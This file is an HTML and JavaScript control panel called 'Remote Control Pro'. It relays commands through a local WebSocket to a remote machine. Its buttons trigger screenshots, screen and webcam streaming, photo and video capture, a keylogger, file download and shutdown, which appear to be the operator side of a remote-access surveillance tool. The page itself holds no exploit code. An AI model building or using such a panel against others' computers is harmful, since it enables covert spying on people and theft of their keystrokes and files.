@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🚀 Remote Control Pro</title>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        padding: 20px;
+        overflow-x: hidden;
+    }
+
+    /* Animated background particles */
+    .particles {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        z-index: 0;
+        pointer-events: none;
+    }
+
+    .particle {
+        position: absolute;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 50%;
+        animation: float 20s infinite;
+    }
+
+    @keyframes float {
+        0%, 100% { transform: translateY(0) translateX(0) rotate(0deg); }
+        33% { transform: translateY(-100px) translateX(50px) rotate(120deg); }
+        66% { transform: translateY(-50px) translateX(-50px) rotate(240deg); }
+    }
+
+    .container {
+        max-width: 1400px;
+        margin: 0 auto;
+        position: relative;
+        z-index: 1;
+    }
+
+    /* Header with glassmorphism */
+    .header {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 20px;
+        padding: 30px;
+        margin-bottom: 30px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+    }
+
+    .header h1 {
+        color: white;
+        font-size: 2.5em;
+        text-align: center;
+        text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+        margin-bottom: 20px;
+        animation: glow 2s ease-in-out infinite;
+    }
+
+    @keyframes glow {
+        0%, 100% { text-shadow: 0 0 20px rgba(255, 255, 255, 0.5), 0 0 30px rgba(255, 255, 255, 0.3); }
+        50% { text-shadow: 0 0 30px rgba(255, 255, 255, 0.8), 0 0 40px rgba(255, 255, 255, 0.5); }
+    }
+
+    /* Connection panel */
+    .connection-panel {
+        display: flex;
+        gap: 15px;
+        align-items: center;
+        justify-content: center;
+        flex-wrap: wrap;
+    }
+
+    .input-group {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .input-group label {
+        color: white;
+        font-weight: 600;
+        font-size: 1.1em;
+    }
+
+    input[type="text"] {
+        padding: 12px 20px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-radius: 10px;
+        background: rgba(255, 255, 255, 0.1);
+        color: white;
+        font-size: 1em;
+        backdrop-filter: blur(5px);
+        transition: all 0.3s;
+    }
+
+    input[type="text"]:focus {
+        outline: none;
+        border-color: #4facfe;
+        box-shadow: 0 0 20px rgba(79, 172, 254, 0.5);
+        background: rgba(255, 255, 255, 0.2);
+    }
+
+    input[type="text"]::placeholder {
+        color: rgba(255, 255, 255, 0.6);
+    }
+
+    /* Buttons */
+    .btn {
+        padding: 12px 30px;
+        border: none;
+        border-radius: 10px;
+        font-size: 1em;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .btn::before {
+        content: '';
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 0;
+        height: 0;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.3);
+        transform: translate(-50%, -50%);
+        transition: width 0.6s, height 0.6s;
+    }
+
+    .btn:hover::before {
+        width: 300px;
+        height: 300px;
+    }
+
+    .btn span {
+        position: relative;
+        z-index: 1;
+    }
+
+    .btn-primary {
+        background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+        color: white;
+        box-shadow: 0 4px 15px rgba(79, 172, 254, 0.4);
+    }
+
+    .btn-primary:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(79, 172, 254, 0.6);
+    }
+
+    /* Status indicator */
+    .status-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+
+    .status-dot {
+        width: 15px;
+        height: 15px;
+        border-radius: 50%;
+        background: #ff4757;
+        box-shadow: 0 0 10px #ff4757;
+        animation: pulse-red 2s infinite;
+    }
+
+    .status-dot.connected {
+        background: #2ed573;
+        box-shadow: 0 0 10px #2ed573;
+        animation: pulse-green 2s infinite;
+    }
+
+    @keyframes pulse-red {
+        0%, 100% { box-shadow: 0 0 10px #ff4757, 0 0 20px #ff4757; }
+        50% { box-shadow: 0 0 20px #ff4757, 0 0 30px #ff4757; }
+    }
+
+    @keyframes pulse-green {
+        0%, 100% { box-shadow: 0 0 10px #2ed573, 0 0 20px #2ed573; }
+        50% { box-shadow: 0 0 20px #2ed573, 0 0 30px #2ed573; }
+    }
+
+    .status-text {
+        color: white;
+        font-size: 1.2em;
+        font-weight: 600;
+    }
+
+    /* Control panels grid */
+    .control-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 20px;
+        margin-bottom: 30px;
+    }
+
+    .control-card {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 15px;
+        padding: 25px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        transition: all 0.3s;
+    }
+
+    .control-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
+        border-color: rgba(255, 255, 255, 0.4);
+    }
+
+    .control-card h3 {
+        color: white;
+        margin-bottom: 15px;
+        font-size: 1.3em;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .control-card .icon {
+        font-size: 1.5em;
+    }
+
+    .control-buttons {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+    }
+
+    .btn-control {
+        background: rgba(255, 255, 255, 0.15);
+        color: white;
+        border: 1px solid rgba(255, 255, 255, 0.3);
+        padding: 12px 20px;
+        border-radius: 8px;
+        font-size: 0.95em;
+        cursor: pointer;
+        transition: all 0.3s;
+        text-align: left;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .btn-control:hover {
+        background: rgba(255, 255, 255, 0.25);
+        border-color: rgba(255, 255, 255, 0.5);
+        transform: translateX(5px);
+    }
+
+    .btn-control:active {
+        transform: scale(0.98);
+    }
+
+    /* Output panel */
+    .output-panel {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 15px;
+        padding: 25px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+    }
+
+    .tabs {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 20px;
+    }
+
+    .tab-btn {
+        background: rgba(255, 255, 255, 0.1);
+        color: white;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        padding: 10px 20px;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s;
+        font-size: 0.95em;
+    }
+
+    .tab-btn:hover {
+        background: rgba(255, 255, 255, 0.2);
+    }
+
+    .tab-btn.active {
+        background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+        border-color: transparent;
+        box-shadow: 0 4px 15px rgba(79, 172, 254, 0.4);
+    }
+
+    .tab-content {
+        display: none;
+    }
+
+    .tab-content.active {
+        display: block;
+        animation: fadeIn 0.3s;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    pre {
+        background: rgba(0, 0, 0, 0.3);
+        color: #2ed573;
+        padding: 20px;
+        border-radius: 10px;
+        max-height: 400px;
+        overflow-y: auto;
+        font-family: 'Courier New', monospace;
+        font-size: 0.9em;
+        line-height: 1.5;
+    }
+
+    pre::-webkit-scrollbar {
+        width: 8px;
+    }
+
+    pre::-webkit-scrollbar-track {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+    }
+
+    pre::-webkit-scrollbar-thumb {
+        background: rgba(255, 255, 255, 0.3);
+        border-radius: 10px;
+    }
+
+    /* Stream viewer */
+    .stream-viewer {
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 10px;
+        padding: 20px;
+        text-align: center;
+    }
+
+    .stream-viewer img {
+        max-width: 100%;
+        border-radius: 8px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+    }
+
+    .stream-info {
+        color: rgba(255, 255, 255, 0.7);
+        margin-top: 15px;
+        font-size: 0.9em;
+        line-height: 1.8;
+    }
+
+    /* Toast notifications */
+    .toast {
+        position: fixed;
+        bottom: 30px;
+        right: 30px;
+        background: rgba(255, 255, 255, 0.15);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.3);
+        color: white;
+        padding: 15px 25px;
+        border-radius: 10px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        animation: slideIn 0.3s ease-out;
+        z-index: 1000;
+    }
+
+    @keyframes slideIn {
+        from {
+            transform: translateX(400px);
+            opacity: 0;
+        }
+        to {
+            transform: translateX(0);
+            opacity: 1;
+        }
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+        .header h1 {
+            font-size: 1.8em;
+        }
+        .control-grid {
+            grid-template-columns: 1fr;
+        }
+    }
+</style>
+</head>
+<body>
+    <!-- Animated background particles -->
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>🚀 REMOTE CONTROL PRO</h1>
+            
+            <div class="connection-panel">
+                <div class="input-group">
+                    <label>🌐 Server IP:</label>
+                    <input type="text" id="serverIP" placeholder="192.168.x.x" />
+                </div>
+                
+                <button class="btn btn-primary" onclick="connect()">
+                    <span>⚡ Connect</span>
+                </button>
+                
+                <div class="status-container">
+                    <div class="status-dot" id="statusDot"></div>
+                    <span class="status-text" id="statusText">Disconnected</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Control panels -->
+        <div class="control-grid" id="controls" style="display:none;">
+            <!-- System Info Card -->
+            <div class="control-card">
+                <h3><span class="icon">💻</span> System Info</h3>
+                <div class="control-buttons">
+                    <button class="btn-control" onclick="sendCmd('process_list')">
+                        📋 Process List
+                    </button>
+                    <button class="btn-control" onclick="sendCmd('system_info')">
+                        ℹ️ System Information
+                    </button>
+                </div>
+            </div>
+
+            <!-- Screen Capture Card -->
+            <div class="control-card">
+                <h3><span class="icon">📸</span> Screen Capture</h3>
+                <div class="control-buttons">
+                    <button class="btn-control" onclick="sendCmd('screenshot')">
+                        📷 Take Screenshot
+                    </button>
+                    <button class="btn-control" onclick="sendCmd('screen_stream_start')">
+                        ▶️ Stream Screen
+                    </button>
+                    <button class="btn-control" onclick="sendCmd('screen_stream_stop')">
+                        ⏹️ Stop Screen Stream
+                    </button>
+                </div>
+            </div>
+
+            <!-- Webcam Control Card -->
+            <div class="control-card">
+                <h3><span class="icon">🎥</span> Webcam Control</h3>
+                <div class="control-buttons">
+                    <button class="btn-control" onclick="sendCmd('webcam')">
+                        📷 Open Webcam App
+                    </button>
+                    <button class="btn-control" onclick="sendCmd('webcam_capture')">
+                        📸 Capture Photo
+                    </button>
+                    <button class="btn-control" onclick="sendCmd('webcam_record')">
+                        🎥 Record Video (15s)
+                    </button>
+                    <button class="btn-control" onclick="sendCmd('webcam_stream_start')">
+                        ▶️ Start Webcam Stream
+                    </button>
+                    <button class="btn-control" onclick="sendCmd('webcam_stream_stop')">
+                        ⏹️ Stop Webcam Stream
+                    </button>
+                </div>
+            </div>
+
+            <!-- Security & Monitoring Card -->
+            <div class="control-card">
+                <h3><span class="icon">🔐</span> Security</h3>
+                <div class="control-buttons">
+                    <button class="btn-control" onclick="sendCmd('keylogger')">
+                        ⌨️ Keylogger
+                    </button>
+                    <button class="btn-control" onclick="sendCmd('lock_screen')">
+                        🔒 Lock Screen
+                    </button>
+                </div>
+            </div>
+
+            <!-- Power Management Card -->
+            <div class="control-card">
+                <h3><span class="icon">⚡</span> Power</h3>
+                <div class="control-buttons">
+                    <button class="btn-control" onclick="if(confirm('Are you sure?')) sendCmd('shutdown')" style="background: rgba(255, 71, 87, 0.2); border-color: rgba(255, 71, 87, 0.5);">
+                        🔴 Shutdown
+                    </button>
+                    <button class="btn-control" onclick="if(confirm('Are you sure?')) sendCmd('restart')">
+                        🔄 Restart
+                    </button>
+                </div>
+            </div>
+
+            <!-- File Management Card -->
+            <div class="control-card">
+                <h3><span class="icon">📁</span> Files</h3>
+                <div class="control-buttons">
+                    <button class="btn-control" onclick="sendCmd('list_files')">
+                        📂 List Files
+                    </button>
+                    <button class="btn-control" onclick="sendCmd('download_file')">
+                        ⬇️ Download File
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Output panel with tabs -->
+        <div class="output-panel">
+            <div class="tabs">
+                <button class="tab-btn active" onclick="switchTab('output')">
+                    📋 Command Output
+                </button>
+                <button class="tab-btn" onclick="switchTab('stream')">
+                    📹 Live Stream
+                </button>
+            </div>
+
+            <!-- Output tab -->
+            <div class="tab-content active" id="output">
+                <pre id="command_output">Waiting for commands...</pre>
+            </div>
+
+            <!-- Stream tab -->
+            <div class="tab-content" id="stream">
+                <div class="stream-viewer">
+                    <img id="webcam_stream" 
+                         src="http://localhost:8080/stream/webcam" 
+                         alt="Stream will appear here when started"
+                         style="display:none;">
+                    <div class="stream-info">
+                        <div>📡 <strong>FPS:</strong> ~15-30 fps</div>
+                        <div>⏱️ <strong>Latency:</strong> ~500ms - 2s</div>
+                        <div>💾 <strong>Bandwidth:</strong> ~2-5 Mbps (720p)</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Create animated particles
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 20; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.width = Math.random() * 60 + 20 + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 20 + 's';
+                particle.style.animationDuration = Math.random() * 20 + 10 + 's';
+                particles.appendChild(particle);
+            }
+        }
+        createParticles();
+
+        let ws;
+
+        function showToast(message) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.animation = 'slideIn 0.3s ease-out reverse';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        function connect() {
+            const ip = document.getElementById('serverIP').value;
+            
+            if (!ip) {
+                showToast('⚠️ Please enter server IP!');
+                return;
+            }
+
+            ws = new WebSocket('ws://localhost:8080');
+
+            ws.onopen = () => {
+                document.getElementById('statusText').innerText = 'Connected';
+                document.getElementById('statusDot').classList.add('connected');
+                document.getElementById('controls').style.display = 'grid';
+                ws.send('SET_IP ' + ip);
+                showToast('✅ Connected successfully!');
+            };
+
+            ws.onmessage = ev => {
+                if (!ev.data.startsWith('stream_frame')) {
+                    document.getElementById('command_output').innerText = ev.data;
+                    showToast('📨 Response received');
+                }
+            };
+
+            ws.onclose = () => {
+                document.getElementById('statusText').innerText = 'Disconnected';
+                document.getElementById('statusDot').classList.remove('connected');
+                document.getElementById('controls').style.display = 'none';
+                showToast('❌ Connection closed');
+            };
+
+            ws.onerror = () => {
+                showToast('⚠️ Connection error!');
+            };
+        }
+
+        function sendCmd(cmd) {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(cmd);
+                showToast('🚀 Command sent: ' + cmd);
+            } else {
+                showToast('⚠️ Not connected!');
+            }
+        }
+
+        function switchTab(tabName) {
+            // Remove active class from all tabs
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+
+            // Add active class to selected tab
+            if (tabName === 'output') {
+                document.querySelectorAll('.tab-btn')[0].classList.add('active');
+                document.getElementById('output').classList.add('active');
+            } else if (tabName === 'stream') {
+                document.querySelectorAll('.tab-btn')[1].classList.add('active');
+                document.getElementById('stream').classList.add('active');
+                document.getElementById('webcam_stream').style.display = 'block';
+            }
+        }
+    </script>
+</body>
+</html>
